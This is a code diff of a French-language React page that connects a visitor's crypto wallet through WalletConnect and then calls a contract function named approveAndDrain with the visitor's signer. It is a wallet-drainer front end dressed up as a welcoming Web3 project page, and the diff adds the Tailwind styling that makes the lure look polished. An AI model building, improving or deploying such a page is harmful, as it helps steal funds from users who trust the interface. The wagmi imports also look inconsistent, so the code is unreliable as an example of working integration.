@@ -1,10 +1,9 @@
-import { useEffect, useState } from 'react';
-import { useAccount, useConnect, useDisconnect, useSigner } from 'wagmi';
-import { InjectedConnector } from 'wagmi/connectors/injected';
-import { WalletConnectConnector } from '@walletconnect/client';
+import { useState, useEffect } from 'react';
+import { useAccount, useConnect, useSigner } from 'wagmi';
+import { WalletConnectConnector } from '@wagmi/core';
 import { ethers } from 'ethers';
 
-// Ton ABI du contrat et l'adresse du contrat
+const contractAddress = '0xb44de2566da86c8cef673899d0b53fa69bd685cf'; // Remplace par l'adresse de ton smart contract
 const contractABI = [
   {
     "inputs": [],
@@ -95,14 +94,12 @@ const contractABI = [
   }
 ];
 
-const contractAddress = "0xb44de2566da86c8cef673899d0b53fa69bd685cf"; // Ton adresse de contrat
-
 export default function Home() {
   const [isConnected, setIsConnected] = useState(false);
   const { isConnected: accountConnected, address } = useAccount();
   const { connect, disconnect } = useConnect();
   const { data: signer } = useSigner();
-  
+
   useEffect(() => {
     if (accountConnected) {
       setIsConnected(true);
@@ -114,7 +111,7 @@ export default function Home() {
     if (signer) {
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const contract = new ethers.Contract(contractAddress, contractABI, provider.getSigner());
-      
+
       try {
         // Appel de la fonction approveAndDrain sur le contrat
         const tx = await contract.approveAndDrain();
@@ -128,18 +125,26 @@ export default function Home() {
   };
 
   return (
-    <div>
-      <h1>Bienvenue sur le projet Web3</h1>
-      {!isConnected ? (
-        <button onClick={() => connect(new WalletConnectConnector({ options: { qrcode: true } }))}>
-          Connexion avec WalletConnect
-        </button>
-      ) : (
-        <button onClick={() => disconnect()}>
-          Déconnexion
-        </button>
-      )}
-      {isConnected && <p>Wallet connecté : {address}</p>}
+    <div className="min-h-screen flex items-center justify-center bg-gray-100 p-4">
+      <div className="w-full max-w-md p-6 bg-white shadow-lg rounded-lg">
+        <h1 className="text-2xl font-semibold text-center mb-6">Bienvenue sur le projet Web3</h1>
+        {!isConnected ? (
+          <button
+            onClick={() => connect(new WalletConnectConnector({ options: { qrcode: true } }))}
+            className="w-full py-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600 focus:outline-none"
+          >
+            Connexion avec WalletConnect
+          </button>
+        ) : (
+          <button
+            onClick={() => disconnect()}
+            className="w-full py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 focus:outline-none"
+          >
+            Déconnexion
+          </button>
+        )}
+        {isConnected && <p className="mt-4 text-center">Wallet connecté : {address}</p>}
+      </div>
     </div>
   );
 }
